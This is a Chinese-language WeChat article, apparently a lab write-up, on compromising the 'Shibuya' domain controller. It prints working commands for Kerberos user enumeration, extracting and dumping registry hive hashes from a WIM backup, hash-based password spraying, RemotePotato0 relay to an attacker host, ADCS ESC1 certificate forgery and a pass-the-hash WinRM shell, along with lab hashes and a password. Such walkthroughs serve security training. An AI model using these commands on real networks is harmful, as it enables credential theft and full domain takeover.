---
title: 利用Windows映像备份与ADCS漏洞攻陷域控
url: https://mp.weixin.qq.com/s/rr1FRCZTptXqGgwwvjgztw
source: Doonsec's feed
date: 2026-03-02
fetch_date: 2026-03-03T04:08:50.141293
---

# 利用Windows映像备份与ADCS漏洞攻陷域控

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/KysoJFiczHUtPTXL3JK7oPIpDAGJ1cBCugqD03fbq7YdRbiarAriaJdAVJ8ib4yTZGCibBPiaD9aOTSLSibWcylswia7haFskYIh8ZJR3IT4CTajsJA/0?wx_fmt=jpeg)

# 利用Windows映像备份与ADCS漏洞攻陷域控

柠檬赏金猎人

![]()

在小说阅读器中沉浸阅读

### 概述

Shibuya是一台Windows Server 2022域控制器，攻击路径涉及Kerberos暴力破解、LDAP枚举、Windows映像文件分析、哈希传递攻击、跨会话中继攻击以及ADCS证书服务漏洞利用。通过逐步深入，最终获取域管理员权限并夺得root.txt。

![](https://mmbiz.qpic.cn/mmbiz_jpg/KysoJFiczHUvtbZGU7QFY656fPFIAHrqST937XTnpEhJdfnSkez1n0lEib0I4NCPfVGslnIOc3XnHUX0xFIibiaUkSWBWmAMx9iboYpmoHE3WZCs/640?wx_fmt=jpeg)

### 技术/功能

* **Kerberos用户枚举**：使用kerbrute工具进行用户名暴力破解
* **LDAP信息收集**：通过获取的机器账户凭证枚举域内用户和组信息
* **Windows映像文件分析**：利用7z工具提取WIM文件中的注册表配置单元
* **哈希提取与传递**：使用secretsdump从注册表文件中提取NTLM哈希并进行密码喷洒攻击
* **跨会话中继攻击**：利用RemotePotato0工具窃取已登录用户的NetNTLMv2哈希
* **ADCS漏洞利用**：通过Certipy工具检测并利用ESC1漏洞伪造域管理员证书
* **权限提升**：结合获取的证书通过WinRM获取域控完全控制权

### 使用示例

#### 1. Kerberos用户枚举

```
kerbrute userenum -d shibuya.vl --dc 10.129.234.42 /opt/SecLists/Usernames/xato-net-10-million-usernames.txt
```

#### 2. 从WIM文件中提取注册表哈希

```
# 提取SAM、SECURITY、SYSTEM文件
7z x AWSJPWK0222-02.wim SAM
7z x AWSJPWK0222-02.wim SECURITY
7z x AWSJPWK0222-02.wim SYSTEM

# 使用secretsdump提取哈希
secretsdump.py -sam SAM -security SECURITY -system SYSTEM local
```

#### 3. 密码喷洒攻击

```
netexec smb shibuya.vl -u users -H 5d8c3d1a20bd63f60f469f6763ca0d50 --continue-on-success
```

#### 4. RemotePotato0跨会话中继攻击

```
# 攻击机设置端口转发
sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:10.129.234.42:8888

# 目标机执行（需要Session ID）
.\RemotePotato0.exe -m 2 -s 1 -x 10.10.14.79 -p 8888
```

#### 5. ESC1漏洞利用获取域管理员证书

```
# 请求管理员证书
certipy req -u nigel.mills -p 'Sail2Boat3' -dc-ip 10.129.234.42 \
  -ca shibuya-AWSJPDC0522-CA -template ShibuyaWeb \
  -upn _admin@shibuya.vl -target AWSJPDC0522.shibuya.vl \
  -key-size 4096 -sid S-1-5-21-87560095-894484815-3652015022-500

# 使用证书认证
certipy auth -pfx _admin.pfx -dc-ip 10.129.234.42
```

#### 6. 通过WinRM获取shell

```
evil-winrm -i 10.129.234.42 -u _admin -H bab5b2a004eabb11d865f31912b6b430
```

### 注意事项

1. **Kerberos枚举**：注意区分机器账户和用户账户，机器账户无法使用NTLM认证
2. **防火墙规则**：进行跨会话中继攻击前需检查目标防火墙规则，确保相关端口开放
3. **证书模板配置**：利用ESC1漏洞时需要确保证书模板允许客户端认证且用户可指定主题
4. **时间同步**：Kerberos认证对时间同步要求严格，确保攻击机与域控时间差在5分钟内
5. **权限要求**：RemotePotato0攻击需要目标用户已登录且具有交互式会话

### 参考链接

* https://github.com/ropnop/kerbrute
* https://github.com/fortra/impacket
* https://github.com/antonioCoco/RemotePotato0
* https://github.com/ly4k/Certipy
* https://github.com/Hackplayers/evil-winrm

---

仅限交流学习使用，如您在使用本工具或代码的过程中存在任何非法行为，您需自行承担相应后果，我们将不承担任何法律及连带责任。如侵权请私聊公众号删文。

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/sz_mmbiz_png/OkRKg4J9smV0q1aJxxA7GF9uXFH0S6D3QRb0jNcE13icxpHvErdgibarS4mwYYE2aicga15MMmcOCdTazgj9ibn0RA/0?wx_fmt=png)

柠檬赏金猎人

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/sz_mmbiz_png/OkRKg4J9smV0q1aJxxA7GF9uXFH0S6D3QRb0jNcE13icxpHvErdgibarS4mwYYE2aicga15MMmcOCdTazgj9ibn0RA/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过